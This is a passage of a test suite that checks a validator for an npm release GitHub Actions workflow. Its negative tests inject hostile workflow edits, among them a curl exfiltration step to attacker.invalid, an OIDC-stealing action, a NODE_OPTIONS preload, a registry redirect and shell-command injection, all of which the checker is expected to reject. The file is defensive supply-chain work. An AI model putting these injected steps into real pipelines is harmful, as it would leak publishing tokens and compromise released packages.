    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has checkout", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: release-artifact\n          path: release-artifact\n      - name: Download integrity artifact",
        "      - name: Checkout\n        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          persist-credentials: false\n      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: release-artifact\n          path: release-artifact\n      - name: Download integrity artifact",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has repository script", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Create or reconcile GitHub Release",
        "      - name: Run script\n        run: node scripts/release-notes.mjs\n      - name: Create or reconcile GitHub Release",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow_dispatch trigger is added", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "on:\n  push:\n    tags:\n      - 'v*'",
        "on:\n  push:\n    tags:\n      - 'v*'\n  workflow_dispatch:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when branch trigger is added", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "on:\n  push:\n    tags:\n      - 'v*'",
        "on:\n  push:\n    tags:\n      - 'v*'\n    branches:\n      - main",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when a publish workflow job timeout is missing", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "    timeout-minutes: 15\n    steps:",
        "    steps:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when release artifact retention is missing", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          name: release-artifact\n          path: release-artifact/\n          retention-days: 7",
        "          name: release-artifact\n          path: release-artifact/",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when integrity artifact retention is missing", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          name: release-integrity\n          path: release-integrity.json\n          retention-days: 7",
        "          name: release-integrity\n          path: release-integrity.json",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job does not use --ignore-scripts", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        'npm publish "./$tarball" --ignore-scripts',
        'npm publish "./$tarball"',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // --- New negative tests for enhanced checker ---

  it("fails when publish job has an arbitrary SHA-pinned action", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Malicious\n        uses: attacker/oidc-stealer@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has a local action", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Local action\n        uses: ./local-action\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has a curl step", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Exfiltrate\n        run: curl -fsS https://attacker.invalid/steal\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has an extra run step", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Create or reconcile GitHub Release",
        "      - name: Extra\n        run: echo hacked\n      - name: Create or reconcile GitHub Release",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when prepare job has issues: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      actions: read",
        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      actions: read\n      issues: write",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has packages: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    permissions:\n      contents: read\n      id-token: write",
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    permissions:\n      contents: read\n      id-token: write\n      packages: write",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when job-level reusable workflow uses @main", async () => {
    root = await buildTree({
      publishContent:
        wellFormedPublish +
        "\n  call:\n    uses: attacker/repo/.github/workflows/pwn.yml@main\n",
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when verify job has no checkout", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Checkout release tag\n        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          fetch-depth: 1\n          persist-credentials: false\n      - name: Download release artifact",
        "      - name: Download release artifact",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when checker is called twice and second call is clean (state isolation)", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
        "actions/checkout@v6.0.2",
      ),
    });
    const { failures: firstFailures } = checkSupplyChainInvariants(root);
    expect(firstFailures).toBeGreaterThan(0);
    await cleanup();

    root = await buildTree();
    const { failures: secondFailures } = checkSupplyChainInvariants(root);
    expect(secondFailures).toBe(0);
    await cleanup();
  });

  // --- Canonical structure violation tests ---

  it("fails when publish job has job-level NODE_OPTIONS env", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish",
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    env:\n      NODE_OPTIONS: --require ./release-artifact/preload.cjs",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish step has custom shell", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish\n        id: publish\n        env:",
        "      - name: Verify manifest and publish\n        id: publish\n        shell: \"bash -c 'echo PWNED >&2; bash {0}'\"\n        env:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has container", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish",
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    container: attacker/image:latest",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job runs-on self-hosted", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest",
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on:\n      - self-hosted\n      - attacker",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when EXPECTED_TAG is replaced with fixed string", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "EXPECTED_TAG: ${{ github.ref_name }}",
        "EXPECTED_TAG: v9.9.9",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when EXPECTED_COMMIT is replaced with fixed string", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "EXPECTED_COMMIT: ${{ github.sha }}",
        "EXPECTED_COMMIT: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when download-artifact uses pattern: *", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: release-artifact\n          path: release-artifact\n      - name: Set up Node",
        '      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          pattern: "*"\n          merge-multiple: true\n          path: release-artifact\n      - name: Set up Node',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when setup-node package-manager-cache is changed", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "package-manager-cache: false",
        "package-manager-cache: true",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has GH_HOST env", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          TAG: ${{ github.ref_name }}",
        "          TAG: ${{ github.ref_name }}\n          GH_HOST: github.enterprise.invalid",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release step has custom shell", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Create or reconcile GitHub Release\n        env:",
        "      - name: Create or reconcile GitHub Release\n        shell: python\n        env:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // --- Workflow envelope violation tests ---

  it("fails when workflow has top-level NODE_OPTIONS env", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "permissions: {}\n",
        "permissions: {}\n\nenv:\n  NODE_OPTIONS: --require ./release-artifact/preload.cjs\n",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow has top-level NPM_CONFIG_REGISTRY env", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "permissions: {}\n",
        "permissions: {}\n\nenv:\n  NPM_CONFIG_REGISTRY: https://attacker.invalid\n",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow has top-level defaults.run.shell", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "permissions: {}\n",
        'permissions: {}\n\ndefaults:\n  run:\n    shell: bash -c "echo PWNED >&2; bash {0}"\n',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow has top-level defaults.run.working-directory", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "permissions: {}\n",
        "permissions: {}\n\ndefaults:\n  run:\n    working-directory: release-artifact\n",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow concurrency group is changed", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  group: npm-publish-${{ github.ref }}\n  cancel-in-progress: false",
        "  group: shared-release-group\n  cancel-in-progress: true",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // --- OIDC setup-node invariant tests ---

  it("fails when setup-node re-adds registry-url", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          node-version: 24\n          package-manager-cache: false",
        "          node-version: 24\n          registry-url: https://registry.npmjs.org",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when setup-node removes package-manager-cache", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          node-version: 24\n          package-manager-cache: false",
        "          node-version: 24",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });
});
